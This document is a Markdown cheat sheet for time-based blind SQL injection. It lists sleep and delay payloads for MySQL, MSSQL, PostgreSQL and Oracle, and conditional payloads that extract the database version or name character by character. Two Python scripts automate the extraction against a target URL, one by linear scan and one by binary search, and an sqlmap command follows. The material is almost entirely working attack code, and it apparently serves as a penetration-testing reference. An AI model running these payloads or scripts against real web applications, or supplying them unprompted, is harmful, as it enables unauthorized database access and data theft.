# SQL Injection - Time-Based Blind

## Detection
```sql
' AND SLEEP(5)-- -              # MySQL
'; WAITFOR DELAY '0:0:5'--      # MSSQL
' AND (SELECT pg_sleep(5))--    # PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--  # Oracle
```

Measure response time. If ~5s delay observed consistently, injection confirmed.

## MySQL Time-Based
```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(version(),1,1))='5',SLEEP(5),0)-- -
' OR SLEEP(5)-- -
'; SELECT SLEEP(5)-- -           # If stacked queries allowed
```

## PostgreSQL Time-Based
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

## MSSQL Time-Based
```sql
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)='m') WAITFOR DELAY '0:0:5'--
```

## Oracle Time-Based
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual) IS NULL--
```

## Extracting Data via Time-Based
```python
import requests
import time
import string

url = "https://target.com/page"
charset = string.ascii_lowercase + string.digits

def check_char(pos, char):
    payload = f"' AND IF(SUBSTRING((SELECT version()),{pos},1)='{char}',SLEEP(3),0)-- -"
    start = time.time()
    requests.get(url, params={"id": f"1{payload}"})
    elapsed = time.time() - start
    return elapsed > 2.5

result = ""
for pos in range(1, 30):
    for c in charset:
        if check_char(pos, c):
            result += c
            print(f"Position {pos}: {c} -> {result}")
            break
    else:
        break
```

## Binary Search for Time-Based (Faster)
```python
def get_char_binary(pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT version()),{pos},1))>{mid},SLEEP(2),0)-- -"
        start = time.time()
        requests.get(url, params={"id": f"1{payload}"})
        if time.time() - start > 1.5:
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

## Considerations
- Network latency can cause false positives/negatives - use consistent baseline requests
- Reduce sleep time for large extractions (2-3s is often enough to distinguish)
- Watch for connection timeouts / WAF rate limiting

## Automated
```bash
sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=3
```
